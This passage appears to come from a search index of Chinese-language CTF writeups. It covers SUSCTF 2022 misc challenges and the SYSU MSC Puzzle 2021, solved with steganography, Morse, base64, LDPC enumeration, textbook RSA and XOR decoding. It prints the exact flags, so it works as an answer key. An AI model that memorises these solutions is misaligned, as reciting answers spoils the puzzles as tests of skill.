Writeup"},{"location":"writeups/susctf2022/#ra2","text":"\u7ea2\u8b66\u81ea\u5236\u5173\u5361\uff0c\u901a\u8fc7\u8fd9\u4e2a\u6e38\u620f\u81ea\u5e26\u7684 Extras \u2192 map editor\uff0c\u5373\u53ef\u8fdb\u5165\u770b\u5230\u5730\u56fe\u4e2d\u7684 lunar flag \u548c billboard \u5176\u4e2d billboard \u4e0a\u64ad\u653e\u7684\u5c31\u662f\u4e09\u5e27 flag \u6216\u8005\u53ef\u4ee5\u627e\u5230\u6e38\u620f\u6587\u4ef6\u5939 mods/rv/maps/ctf-01\uff0c\u4fee\u6539\u5176\u4e2d\u63a7\u5236\u6e38\u620f\u903b\u8f91\u7684 lua \u6587\u4ef6\uff0c\u5c06\u96be\u5ea6\u964d\u4f4e\uff0c\u53ef\u4ee5\u8fdb\u5165\u6e38\u620f\u627e\u5230 flag flag: SUSCTF{RED_ALERT_WINNER!!!}","title":"ra2"},{"location":"writeups/susctf2022/#tanner","text":"Tanner \u56fe\uff0cLDPC \u7801\uff0c\u53d1\u73b0\u6587\u4ef6\u5c3e\u6709\u6240\u6c42\u5185\u5bb9\uff1a THE FLAG IS the sha256 of the sum ofthe proper codewords(binary plus)which satisfy the condition.(note: with no zeros front) \u5373\u6c42\u6240\u6709\u6ee1\u8db3\u8fd9\u4e2a LDPC \u6821\u9a8c\u7801\u7684\u6240\u6709\u6bd4\u7279\u5e8f\u5217\u52a0\u8d77\u6765\u4e4b\u540e\u7684\u503c\u7684 sha256 \u4ece\u7f51\u4e0a\u968f\u4fbf\u627e\u4e86\u4e2a decoder \u6765\u7528\uff1a http://leohope.com/\u89e3\u95ee\u9898/2019/01/11/ldpc-with-python/ \u968f\u610f\u4f20\u5165\u4e00\u4e2a\u6bd4\u7279\u5e8f\u5217\uff0c\u5982\u679c\u5b83\u89e3\u51fa\u6765\u7684\u5e8f\u5217\u6ca1\u6709\u53d8\u5316\uff0c\u5219\u8bf4\u660e\u5f53\u524d\u5e8f\u5217\u6ee1\u8db3\u9700\u8981 \u4e00\u5171 10 \u4e2a\u6bd4\u7279\uff0c1024 \u79cd\u60c5\u51b5\uff0c\u679a\u4e3e\u5373\u53ef\uff1a import hashlib import numpy as np def decode ( H , y , m , n , p ): fr = np . zeros (( m , 2 * p )) fs = np . zeros (( m , 2 * p )) sum = np . zeros ( m ) c = np . zeros (( n , p + 2 )) y1 = np . zeros ( n ) for i in range ( m ): count = 0 for j in range ( n ): if H [ i ][ j ] == 1 : fr [ i , count ] = y [ j ] sum [ i ] = sum [ i ] + y [ j ] count = count + 1 for i in range ( m ): for j in range ( 2 * p ): fs [ i , j ] = ( sum [ i ] - fr [ i , j ]) % 2 for i in range ( m ): count = 0 for j in range ( n ): if H [ i ][ j ] == 1 : index = int ( c [ j , p + 1 ]) c [ j , index ] = fs [ i , count ] count = count + 1 c [ j , p + 1 ] += 1 for i in range ( n ): c [ i , p ] = y [ i ] for i in range ( n ): count = 0 for j in range ( p + 1 ): if c [ i , j ] == 1 : count += 1 if count > ( p + 1 ) / 2 : y1 [ i ] = 1 return y1 m = 5 n = 10 p = 2 H = np . zeros (( 5 , 10 )) H = [[ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 ], [ 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 ], [ 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 ], [ 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 ], [ 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 ]] ans = 0 for i in range ( 1024 ): bi = f \" { bin ( i )[ 2 :] : >010 } \" lst = list ( map ( int , bi )) res = decode ( H , lst , m , n , p ) if all ( lst == res ): ans += i print ( hashlib . sha256 ( bin ( ans )[ 2 :] . encode ( \"utf-8\" )) . hexdigest ()) # c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1 flag: SUSCTF{c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1}","title":"Tanner"},{"location":"writeups/susctf2022/#audio","text":"\u97f3\u9891\u9690\u5199\uff0c\u5df2\u7ecf\u7ed9\u4e86\u4fee\u6539\u540e\u7684\u6587\u4ef6\u548c\u539f\u6587\u4ef6\uff0c\u80af\u5b9a\u8981\u6bd4\u8f83\u5f02\u540c\uff0c\u76f4\u63a5\u5728 Au \u91cc\u8fdb\u884c\u64cd\u4f5c \u5148\u5339\u914d\u54cd\u5ea6\uff0c\u7136\u540e\u7ed9\u4e00\u6bb5\u97f3\u9891\u53cd\u76f8\uff0c\u4e4b\u540e\u4e24\u6bb5\u97f3\u9891\u8fdb\u884c\u591a\u8f68\u6df7\u97f3\uff0c\u8fd9\u6837\u76f8\u540c\u90e8\u5206\u4f1a\u62b5\u6d88\u6389 \u53ef\u4ee5\u5f88\u6e05\u695a\u5730\u542c\u5230\u4e2d\u95f4\u6709\u4e00\u6bb5\u6ef4\u6ef4\u58f0\uff0c\u662f\u6469\u5c14\u65af\u7535\u7801\uff0c\u6284\u5199\u7ffb\u8bd1\uff1a ... ..- ... -.-. - ..-. -- .- ... - . .-. --- ..-. .- ..- -.. .. --- SUSCTFMASTEROFAUDIO flag: SUSCTF{MASTEROFAUDIO}","title":"AUDIO"},{"location":"writeups/susctf2022/#misound","text":"\u97f3\u9891\uff0c\u660e\u663e\u662f SSTV\uff0c\u4f46\u662f\u4e2d\u95f4\u7a7f\u63d2\u4e86\u6742\u4e71\u7684\u97f3\u9891\uff0c\u88c1\u526a\u51fa\u6765\uff1a AnEWmuLTiPLyis_etimes_wiLLbEcomE_B \u518d\u6839\u636e hint\uff0c\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u65b0\u4e58\u6cd5\u8fd0\u7b97 e * = _B \u610f\u4e49\u4e0d\u660e \u518d\u628a wav \u4f20\u5165 SilentEye\uff0c\u5f97\u5230\uff1a MjA3IDM1OSAyMjAgMjI0IDM1MiAzMTUgMzU5IDM3NCAyOTAgMzEwIDI3NyA1MDcgMzkxIDUxMyA0MjMgMzkyIDUwOCAzODMgNDQwIDMyMiA0MjAgNDI3IDUwMyA0NjAgMjk1IDMxOCAyNDUgMzAyIDQwNyA0MTQgNDEwIDEzMCAzNjkgMzE3 base64 \u89e3\u7801\uff1a 207 359 220 224 352 315 359 374 290 310 277 507 391 513 423 392 508 383 440 322 420 427 503 460 295 318 245 302 407 414 410 130 369 317 \u4e09\u5341\u56db\u4e2a\u6570\u5b57\uff0c\u5bf9\u5e94\u524d\u9762\u7684\u5b57\u7b26\u4e32\u662f\u4e09\u5341\u56db\u4e2a\u5b57\u7b26\uff0c\u53ef\u80fd\u662f\u8fdb\u884c\u4e86\u67d0\u4e9b\u64cd\u4f5c \u7136\u540e\u80fd\u786e\u5b9a\u7684\u662f flag \u5f00\u5934\u7ed3\u5c3e\u662f SUSCTF{ \u548c } \u8fdb\u884c\u6f2b\u957f\u7684\u8fd0\u7b97\u548c\u731c\u6d4b\uff0c\u6700\u540e\u53d1\u73b0 AnEWmuLTiPLyis_etimes_wiLLbEcomE_B \u8fd9\u4e2a\u5b57\u7b26\u4e32\u9010\u5b57\u7b26\u4e58 flag \u540e\u503c\u7684\u53d8\u5316\u8d8b\u52bf\u548c\u524d\u9762 SilentEye \u7ed3\u679c\u7684\u8d8b\u52bf\u76f8\u540c\uff0c\u628a\u5df2\u77e5\u7684\u5199\u4e0b\u6765\uff0c\u8fdb\u884c\u7ebf\u6027\u56de\u5f52\u62df\u5408 207 , 5395 359 , 9350 220 , 5727 224 , 5829 352 , 9156 315 , 8190 359 , 9348 317 , 8250 F(x) = 26.011670619246555*x+4.942379114107098 >>> def f ( x ): ... return 26.011670619246555 * x + 4.942379114107098 ... >>> for x , y in zip ([ 207 , 359 , 220 , 224 , 352 , 315 , 359 , 374 , 290 , 310 , 277 , 507 , 391 , 513 , 423 , 392 , 508 , 383 , 440 , 322 , 420 , 427 , 503 , 460 , 295 , 318 , 245 , 302 , 407 , 414 , 410 , 130 , 369 , 317 ], [ 65 , 110 , 69 , 87 , 109 , 117 , 76 , 84 , 105 , 80 , 76 , 121 , 105 , 115 , 95 , 101 , 116 , 105 , 109 , 101 , 115 , 95 , 119 , 105 , 76 , 76 , 98 , 69 , 99 , 111 , 109 , 69 , 95 , 66 ]): ... print ( chr ( round ( f ( x ) / y )), end = \"\" ) ... SUSCTF { tHe_matter_iS_unremArkab1e } flag: SUSCTF{tHe_matter_iS_unremArkab1e}","title":"misound"},{"location":"writeups/sysu_msc_puzzle/","text":"SYSU MSC Puzzle 2021 Writeup \u00b6 MSC Puzzle \u662f\u7531\u4e2d\u5c71\u5927\u5b66 MSClub \u4e0e\u4e2d\u5c71\u5927\u5b66 W4terDr0p \u6218\u961f\u8054\u5408\u4e3e\u529e\u7684\u8da3\u5473\u6027\u89e3\u8c1c\u6e38\u620f Abstract \u57fa\u672c\u4e0a\u90fd\u662f GZTime \u51fa\u7684\u9898\uff0c\u7b97\u5230 CTF \u91cc\u5c31\u90fd\u662f misc \u7c7b\uff0c\u4e00\u5171 24 \u9053\u9898\uff0c\u4e0b\u9762\u662f\u7b80\u8981\u7684 writeup\uff1a \u4f60\u597d\uff01\u52c7\u58eb \u00b6 \u5ba3\u4f20\u6d77\u62a5\u548c\u9996\u9875\u90fd\u6709\uff0cflag\uff1a msc{He1lo_Wor1d} \u8001\u53e4\u8463 \u00b6 -.-. --- -.. . --- ..-. - .... . .---- ----. - .... -.-. . -. - ..- .-. -.-- \u6469\u5c14\u65af\u7535\u7801\uff0c\u6839\u636e\u9996\u9875\u7684\u8bf4\u660e\u5728\u5355\u8bcd\u95f4\u52a0\u4e0a\u4e0b\u5212\u7ebf\u5f97\u5230 flag\uff1a msc{CODE_OF_THE_19TH_CENTURY} \u8eb2\u5728\u5899\u540e \u00b6 \u6253\u5f00 DevTools \u770b Console\uff0cflag\uff1a msc{Wow_Y0u_f1nd_me} \u9690\u8eab\u836f\u6c34 \u00b6 \u6253\u5f00 DevTools \u770b\u4ee3\u7801\uff0c\u6709\u4e00\u4e2a display: none \u7684 flag\uff1a msc{Inv1sibility_P0tiOn} \u5b8c\u5f62\u586b\u7a7a \u00b6 We, the rustling leaves, have a voice that answers the storms, but who are you so silent? I am _ ____. \u641c\u7d22\u8fd9\u6bb5\u8bd7\u6b4c\u5f97\u5230\u7a7a\u7f3a\u5185\u5bb9\uff0c\u683c\u5f0f\u5316\u4e00\u4e0b\u5f97\u5230 flag\uff1a msc{a_mere_flower} \u53bb\u95ee\u5bfc\u822a \u00b6 \u53bb\u627e\u90a3\u4e2a\u5730\u65b9\u5427\uff01\ud83d\udc7b.\ud83d\udc7e.sysums.club \u5e76\u4e14\u53ef\u4ee5\u53d1\u73b0\u6709\u4e00\u4e2a display: none \u7684 TXT \u5b57\u6837 \u94fe\u63a5\u76f4\u63a5\u8f6c\u5230\u7684\u5730\u5740\u662f http://xn--9q8h.xn--dr8h.sysums.club/ \u6240\u4ee5\u7528 dig \u547d\u4ee4\u67e5\u8be2\u4e00\u4e0b\u8fd9\u4e2a\u57df\u540d\u7684 TXT \u8bb0\u5f55\u5c31\u53ef\u4ee5\u4e86 dig xn--9q8h.xn--dr8h.sysums.club txt flag\uff1a msc{Domain_w1th_IDNs} \u4e16\u95f4\u4e07\u7269\u7684\u7b54\u6848 \u00b6 The answer to the ultimate question of life, the universe, and everything equals to A^3 + B^3 + C^3 \u52c7\u58eb\uff0c\u8fd9\u9053\u9898\u7684\u7b54\u6848\u662f msc{A+B+C} \u4e16\u95f4\u4e07\u7269\u7684\u7b54\u6848\u5373\u6307 42\uff0c\u7136\u540e\u641c\u7d22\u5f97\u5230 \\[ -80538738812075974^3 + 80435758145817515^3+ 12602123297335631^3 = 42 \\] \u6240\u4ee5 flag\uff1a msc{12499142631077172} \u6211\u7684\u5496\u5561 \u00b6 \u6211\u4eec\u7684\u9152\u9986\u91c7\u7528\u6700\u65b0\u7684 HTCPCP/1.0 \u534f\u8bae\u4e3a\u60a8\u63d0\u4f9b\u670d\u52a1\uff01 \u201c\u563f\uff0c\u9152\u4fdd\uff01\u6211\u7684\u5496\u5561\u5462\uff1f\u201d \u201c\u5728\u505a\u4e86\uff01\u201d \u8be5\u6b7b\uff0c\u6211\u5fd8\u4e86\u8ba9\u4ed6\u5c11\u52a0\u70b9\u725b\u5976\uff0c\u6211\u5f97\u7acb\u523b\u8ba9\u4ed6\u505c\u4e0b\uff01 \u641c\u7d22 HTCPCP/1.0 \uff08\u8d85\u6587\u672c\u5496\u5561\u58f6\uff09\u534f\u8bae\uff0c\u505c\u6b62\u52a0\u5165\u725b\u5976\u7684\u8bf7\u6c42\u662f WHEN\uff0c\u6240\u4ee5 flag\uff1a msc{WHEN} \u8bbe\u8ba1\u5e08 \u00b6 \u300c\u6211\u60f3\u8981\u8fd9\u4e2a\u5b57\u5c0f\u4e00\u70b9\u7684\u540c\u65f6\u5927\u4e00\u70b9\u300d ww91igfYzsb0AguGyMvZDcbKzxnPz25LCIekBxnJE1qWxZrUB3rOzxjFqMfZzty0Fq== \u5927\u5199\u8f6c\u5c0f\u5199\uff0c\u5c0f\u5199\u8f6c\u5927\u5199\uff0c\u7136\u540e base64 \u89e3\u7801\uff0c\u5f97\u5230 flag\uff1a msc{T0_4nother_Base64} \u76d1\u542c\u7535\u8bdd \u00b6 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/phone.mp3 \u662f\u4e00\u4e32\u7535\u8bdd\u7684\u62e8\u53f7\u97f3\uff0c\u653e\u5230 Au \u91cc\u9762\u770b\u9891\u8c31\uff0c\u628a\u5bf9\u5e94\u6309\u952e\u6284\u4e0b\u6765\u5c31\u884c\u4e86\uff0c\u5177\u4f53\u662f\u4ec0\u4e48\u8bb0\u4e0d\u5f97\u4e86 \u4e00\u5f20\u56fe\u7247 \u00b6 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc.png stegsolve \u6253\u5f00\uff0c\u5728 red 0 \u53ef\u4ee5\u6e05\u6670\u770b\u5230 flag\uff1a msc{Text_Hidd3n_Und6r_The_1mage} \u6570\u5b57\u5e8f\u5217 \u00b6 ..., 22, 30, 42, 56, ? , 101, 135, 176, 231, 297, ... ..., 72, 81, 90, 100, 110, ?, 132, 144, 156, 169, ... ..., 43, 47, 55, 67, 79, ?, 123, 155, 171, 175, ... ..., 891, 9805, 25, 527, 23, ?, 17, 37, 131, 43, ... ..., 58, 51, 89, 28, 97, ?, 30, 103, 107, 62, ... ..., 20, 26, 36, 50, 60, ?, 135, 138, 248, 315, ... ..., 2, 1, 9, 35, 77, ?, 91, 49, 15, 2, ... ..., 49, 62, 70, 77, 91, ?, 103, 107, 115, 122, ... ..., 8, 26, 60, ?, 196, 308, 456, 645, 880, 1166, ... \u76f4\u63a5\u5206\u522b\u7c98\u8d34\u5230 OEIS \u4e2d\uff0c\u5f97\u5230\u9700\u8981\u586b\u7684\u6570\u5b57\uff1a 77 121 95 83 101 114 105 101 115 \u770b\u6570\u5b57\u8303\u56f4\u633a\u89c4\u6574\uff0cASCII \u8f6c\u6362\u4e00\u4e0b\u5f97\u5230 flag\uff1a msc{My_Series} \u672a\u77e5\u4fe1\u53f7 \u00b6 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/signal.mp3 \u6211\u89c9\u5f97\uff0c\u8fd9\u91cc\u9762\u6709\u8e4a\u8df7\uff01\u4f60\u77e5\u9053\u4e8c\u5341\u4e16\u7eaa\u4e94\u516d\u5341\u5e74\u4ee3\u7684\u7535\u89c6\u662f\u4f7f\u7528\u6444\u50cf\u7ba1\u548c\u7535\u5b50\u76d1\u89c6\u5668\u5236\u6210\u7684\u5417\uff1f \u6240\u4ee5\u5e94\u8be5\u662f SSTV\uff08\u6162\u626b\u63cf\u7535\u89c6\uff09\u4f20\u8f93\u56fe\u7247\uff0c\u7528\u624b\u673a\u8f6f\u4ef6 Robot36 \u5c31\u53ef\u4ee5\u8f6c\u6362\uff0c\u5f97\u5230\uff1a \u626b\u63cf\u5f97\u5230 flag\uff1a msc{SSTV_transfer_image} \u53c8\u4e00\u5f20\u56fe\u7247 \u00b6 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc2.png \u8fd8\u662f\u6254\u5230 stegsolve \u91cc\uff0c\u5728 red0 green0 blue0 \u5206\u522b\u80fd\u770b\u5230\u6587\u5b57\uff0c\u5408\u8d77\u6765\u662f \u5bc6\u7801\u662f p455w0rd binwalk \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a png \u91cc\u504f\u79fb 0xC23A \u540e\u9762\u85cf\u4e86\u4e00\u4e2a zip\uff0c\u63d0\u53d6\u51fa\u6765\u7528\u5bc6\u7801\u89e3\u538b\u5f97\u5230\u4e00\u4e2a svg \u6587\u4ef6 \u6d4f\u89c8\u5668\u6253\u5f00\u4e4b\u540e\u53d1\u73b0\u6709\u4e00\u4e2a\u767d\u8272\u77e9\u5f62\uff0c\u5220\u6389\u5b83\u5c31\u80fd\u770b\u5230 flag\uff1a msc{svg_The_vectors} \u76f2\u4eba\u6570\u5b66\u5bb6 \u00b6 \u2838\u2829\u282e\u2830\u2824\u2806\u2818\u2806\u2810\u2837\u282d\u2818\u2812\u2810\u2809\u2815\u280e\u2839\u282d\u280c\u2806\u283c\u282c\u2839\u2802\u280c\u2806\u283c\u283e\u281c\u2832\u2824\u282d\u2818\u2806\u2810\u283b\u2819\u282d\u2838\u2831 Tip: \u5c06\u7ed3\u679c\u56db\u820d\u4e94\u5165\u4fdd\u7559 7 \u4f4d\u5c0f\u6570\uff0c\u5e76\u7528_\u66ff\u6362\u5c0f\u6570\u70b9\u540e\u63d0\u4ea4 \u5bf9\u7167\u6559\u7a0b https://nemeth.aphtech.org/ \u5b66\u4e60\uff0c\u8f6c\u6362\u516c\u5f0f\uff1a \\[ \\int_{-2}^2(x^3\\cos\\frac{x}{2}+\\frac{1}{2})\\sqrt{4-x^2}\\mathrm dx = \\pi \\approx 3.1415927 \\] \u6240\u4ee5 flag\uff1a msc{3_1415927} \u6700\u5c0f\u7684\u8bed\u8a00 \u00b6 \u52c7\u58eb\uff0c\u636e\u8bf4\u8fd9\u4e2a\u4e16\u754c\u5728\u5f88\u4e45\u8fdc\u7684\u65f6\u5019\u6709\u4e00\u4f4d\u51ef\u6492\u5927\u5e1d\uff0c\u5728\u4ed6\u79bb\u4e16\u7684\u65f6\u5019\uff0c\u4e3a\u8fd9\u4e2a\u4e16\u754c\u521b\u9020\u4e86\u4e00\u79cd\u6700\u5c0f\u7684\u8bed\u8a00\uff0c\u6211\u4eec\u90fd\u4e0d\u6562\u8bfb\u51fa\u5b83\u7684\u540d\u79f0\u2026\ubrainfuck \u8f93\u51fa\u5f97\u5230\uff1a =WYxy^WXArn(qs|p!-k<~<X4i;A[!n97zu4Yru{@=={qkw+78tx~[94:*By66&@U<5.&;66&:047V@D[,r:60}55^{yX<3@u~.sv/m4(]i)1pV!op[(Z:54f/ssgt(!XZ|xq|ouuv+@|!=u \u6839\u636e\u9898\u9762\u7684\u51ef\u6492\uff0c\u53ef\u4ee5\u63a8\u6d4b\u662f ASCII \u504f\u79fb\uff0c\u7136\u540e\u628a\u8f93\u51fa\u9650\u5236\u5728 [33, 126] \u4e2d\uff08ASCII\u53ef\u89c1\u5b57\u7b26\uff09\uff0c\u7b2c 54 \u6b21\u504f\u79fb\u7684\u7ed3\u679c\uff1a v24ST923zMIaLNWKZfFuYu3mDtz6ZIrpUPm4MPVyvvVLFRdpqOSY6rmsc{Too_y0ung_too_simp1y}6eMsoiXnn9VT3ulyPYgNQhHma8DbjK1ZJK6a5snmAhNNBOaZ35WSLWJPPQdyWZvP \u4e2d\u95f4\u5c31\u662f flag\uff1a msc{Too_y0ung_too_simp1y} \u4e00\u4e2a\u4f20\u8bf4 \u00b6 \u201c\u52c7\u58eb\uff0c\u6211\u542c\u8fc7\u4e00\u4e2a\u53e4\u8001\u7684\u4f20\u8bf4\u2026\u2026\u201d \u201c\u8bf7\u8bb2\uff01\u201d \u300c1024\u00d7768 \u5927\u5c0f\u7684\u56fe\u7247\uff0c\u53ef\u4ee5\u8f7b\u677e\u85cf\u4e0b 786432 \u4e2a\u5730\u5740\u3002\u300d https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/justcolor.png \u4e00\u4e2a\u7eaf\u8272\u6587\u4ef6\uff0c\u6839\u636e\u9898\u9762\u53ef\u4ee5\u63a8\u6d4b\u662f\u8bfb\u53d6 rgba \u503c\u4f5c\u4e3a ip \u5730\u5740 \u6240\u4ee5\u5199\u4e2a\u811a\u672c\u8bfb\u4e00\u4e0b from PIL import Image ; print ( Image . open ( \"justcolor.png\" ) . getpixel (( 0 , 0 ))) \uff0c\u5f97\u5230 ip \u5730\u5740\uff1a116.63.166.50 \u8bbf\u95ee\u5f97\u5230 flag\uff1a msc{Hide_IP_in_RGBA} \u65f6\u95f4\u5546\u4eba \u00b6 \u4f60\u53d1\u73b0\u4e86\u4e00\u5757\u5e03\u6ee1\u82d4\u85d3\u7684\u77f3\u677f\uff0c\u4e0a\u9762\u523b\u7740\u4e0b\u9762\u7684\u51e0\u4e2a\u5b57\uff1a \u2003\u22a7\u00e3\u22b7\u00ac\u00a7\u00d7\u00e3\u02c6\ud835\udd0e \u4f60\u770b\u4e0d\u61c2\uff0c\u4f46\u5927\u53d7\u9707\u64bc\u3002 \u8def\u8fb9\u6709\u4e2a\u795e\u79d8\u7684\u9ed1\u8863\u5546\u4eba\uff0c\u4ed6\u81ea\u79f0\u80fd\u4e3a\u4f60\u63d0\u4f9b\u5e2e\u52a9\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u82db\u523b\u7684\u6761\u4ef6\uff1a\u4f60\u5fc5\u987b\u5728\u6bcf\u5929\u51cc\u6668\u56db\u70b9\u7684\u7b2c\u4e00\u4e2a\u516b\u5206\u949f\u5185\u8fc7\u6765\u627e\u4ed6\uff0c\u4ed6\u624d\u80fd\u7ed9\u4f60\u63d0\u4f9b\u7ebf\u7d22\u3002 \u8c03\u6574\u65f6\u95f4\u5230\u51cc\u6668\u56db\u70b9\u7684\u7b2c\u4e00\u4e2a\u516b\u5206\u949f\u5185\uff0c\u5f97\u5230 hint\uff1a \u5546\u4eba\u770b\u7740\u4f60\uff0c\u4ec0\u4e48\u8bdd\u4e5f\u6ca1\u8bf4\uff0c\u7ed9\u4f60\u9012\u4e86\u4e00\u5f20\u7eb8\u6761\uff0c\u4e0a\u9762\u5199\u7740\uff1acharref\u3002 \u641c\u7d22\u5f97\u5230\u5b57\u7b26\u5bf9\u7167\u8868\uff1a https://dev.w3.org/html5/html-author/charref \u7136\u540e\u4f9d\u6b21\u641c\u7d22\u8fd9\u4e9b\u5b57\u7b26\uff0c\u9996\u5b57\u6bcd\u62fc\u8d77\u6765\u5c31\u662f flag\uff1a msc{mainstacK} \u8ffd\u8e2a\u76ee\u6807 \u00b6 \u4e00\u5f20\u901a\u7f09\u4ee4\u8d34\u5728\u6751\u53e3\u7684\u516c\u544a\u724c\u4e0a\uff0c\u636e\u8bf4\u6355\u83b7\u5230\u4e86\u76d7\u8d3c\u4e0b\u4e00\u6b21\u8981\u4f5c\u6848\u7684\u5730\u65b9\uff0c\u4f46\u6ca1\u4eba\u770b\u5f97\u61c2\u3002 7PMM399R+FQ2 \u201c\u54e6\uff0c\u4f60\u53ea\u9700\u8981\u7528**********\u5c31\u80fd\u5f97\u5230\u7b54\u6848\u201d \u201c\u54e6\uff01\u6536\u5230\uff01\u201d \u201c\u4f60\u77e5\u9053 The simplest way to talk about location \u5417\uff1f\u201d \u201c\u77e5\u9053\u2026\u2026\u539f\u6765\u4f60\u5c31\u662f\u60f3\u8981\u90a3\u4e09\u4e2a\u5355\u8bcd\u554a\u201d \u76f4\u63a5\u4f7f\u7528 \u4e09\u8bcd\u5730\u5740 \u8c03\u6210\u82f1\u6587\u641c\u7d22 7PMM399R+FQ2 \u5f97\u5230\u4f4d\u7f6e\u7684\u4e09\u4e2a\u5355\u8bcd ///flux.tank.pitch \u6240\u4ee5 flag\uff1a msc{flux_tank_pitch} \u7d27\u6025\u5524\u9192 \u00b6 \u95ee\u9898 from Crypto.Util.number import * p = 0xbb1a21ab46e16672a6dfe537c5d03121252685a1a72fab827ed14d61caa80f68b9bda9fb0d9651719ab099d05fd0da03443a50106533f1034a81e280cd3e85fd q = 0x85eed89c104292b715a45ec8a1c3328506b429c2b7477c9ab094313fcf0020ba7352b102608cab79bde92978aedb052a546fb289c453feac87ee791ba1019579 n = p * q e = 0x10001 answer = b 'something you dont know' m = bytes_to_long ( answer ) c = pow ( m , e , n ) # c = 0x17c7af1ec9c020eb9d8f26049f002b58f93591a817ebff4c00e9e46254261db54a2c2d086dd0f532994329faf2133b1c7002913b187f898d87c8093b2290440e927 78956c60b92f27e3dc4d15b4c79f97b79bca253b0b4542375c37f8e37e1f8e38d728634133376eacd2c448aa523b2eda0b4c5f2af47250147f4193d58596c \u57fa\u7840\u7684 RSA\uff0c\u8ba1\u7b97\u51fa d \u7136\u540e\u89e3\u5bc6\u5c31\u53ef\u4ee5\u5f97\u5230 flag\uff1a d = pow ( e , - 1 , ( p - 1 ) * ( q - 1 )) print ( long_to_bytes ( pow ( c , d , n ))) # b'msc{W0w_You_know_H0w_to_d3crypt_the_RSA}' Emojis \u00b6 \u201c\u8fd9\u662f\u4e00\u4e32 EMOJI \uff0c\u91cc\u9762\u4f1a\u85cf\u7740\u4ec0\u4e48\u6837\u7684\u4fe1\u606f\u5462\uff1f\u201d \ud83d\ude43\ud83d\udcb5\ud83c\udf3f\ud83c\udfa4\ud83d\udeaa\ud83c\udf0f\ud83d\udc0e\ud83e\udd4b\ud83d\udeab\ud83d\ude06\u2705\ud83d\ude0a\ud83d\udc49\ud83d\udc63\ud83d\udcc2\u23e9\ud83d\ude06\ud83c\udf3f\ud83c\udf2a\ud83d\ude0e\ud83c\udf75\u2603\ud83d\udcc2\ud83d\udeb9\ud83d\udc4c\ud83c\udff9\ud83d\udc0e\ud83c\udf3f\ud83d\ude00\ud83d\udc63\ud83c\udfce\ud83d\ude0d\ud83d\ude06\ud83c\udf74\u2705\ud83d\udc41\u2705\u2705\ud83d\ude06\ud83d\udd79\ud83d\udd2c\ud83d\udc0d\ud83c\udf85\u2716\ud83c\udf2a\ud83d\udc63\ud83d\udeb9\ud83d\udca7\ud83c\udf74\ud83d\udcb5\ud83c\udf4d\ud83c\udf2a\u2709\ud83d\udc41\ud83d\udeaa\ud83d\udd2a\u23e9\ud83d\udca7\ud83c\udf83\ud83e\udd4b\ud83d\udd79\ud83c\udf4e\ud83d\ude0a\u2139 \u54e6\u5bf9\u4e86\uff0c\u6211\u8981\u7684\u662f\u5ffd\u7565\u8bef\u5dee\u540e\u7684\u6570\u5b57\u54e6~ DevTools \u91cc\u53ef\u4ee5\u770b\u5230 display: none \u7684 aes\uff1f\u6240\u4ee5\u5e94\u8be5\u662f\u4f7f\u7528 emoji-aes \u6839\u636e\u9898\u9762\u4e2d\u7684\u5168\u5927\u5199\u3001\u4ee3\u7801\u5757\u5305\u88f9\u7684 EMOJI \uff0c\u53ef\u4ee5\u63a8\u6d4b\u51fa key \u5c31\u662f EMOJI\uff0c\u89e3\u5bc6\u5f97\u5230\uff1a ORANGE RED YELLOW GREEN GOLD \u6839\u636e\u989c\u8272\u4ee5\u53ca\u9898\u9762\u4e2d\u7684\u201c\u5ffd\u7565\u8bef\u5dee\u201d\u731c\u6d4b\u662f\u4e94\u8272\u73af\u7535\u963b\uff0c\u8f6c\u6362\u5f97\u5230\u5ffd\u7565\u8bef\u5dee\u540e\u662f 32400000 \u6b27\u59c6\uff0c\u6240\u4ee5 flag\uff1a msc{32400000} \u7b80\u6613\u52a0\u5bc6 \u00b6 \u636e\u8bf4\u8fd9\u662f\u4e00\u79cd\u6781\u5176\u666e\u904d\u7684\u52a0\u5bc6\u65b9\u6cd5\u2026\u2026 \u800c\u4e14\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u89e3\u5bc6\u2026\u2026 \u6216\u8bb8\u2026\u2026\u4f60\u53ef\u4ee5\u542c\u5230\u6765\u81ea\u7b54\u6848\u7684\u58f0\u97f3\u2026\u2026 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc.enc \u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u89e3\u5bc6\u7684\u7b80\u6613\u52a0\u5bc6\uff0c\u53ef\u4ee5\u731c\u6d4b\u662f\u5f02\u6216\uff0c\u7136\u540e\u6253\u5f00\u770b\u5341\u516d\u8fdb\u5236\u53d1\u73b0\u5f88\u591a 0x66 \uff0c\u6240\u4ee5\u8003\u8651\u5168\u90e8\u5f02\u6216 0x66 \uff1a import struct res = [] with open ( \"msc.enc\" , \"rb\" ) as f : while True : c = f . read ( 1 ) if not c : break res . append ( ord ( c ) ^ 0x66 ) with open ( \"res.bin\" , \"wb\" ) as f : for each in res : f . write ( struct . pack ( \"B\" , each )) \u5f97\u5230\u7684 res.bin \u4e2d\u53ef\u4ee5\u5f88\u5bb9\u6613\u53d1\u73b0 FL Keys \u548c\u4e00\u4e9b\u952e\u540d\uff0c\u7528 fl \u6216\u8005\u5e93\u4e50\u961f\u7b49\u8f6f\u4ef6\u6253\u5f00\u5c31\u53ef\u4ee5\u770b\u5230 flag\uff1a msc{The_xor_midi_GIFT} \u56fe\u50cf\u5904\u7406\u5927\u5e08 \u00b6 \u4f60\u5c31\u662f\u56fe\u50cf\u5904\u7406\u5927\u5e08\uff01 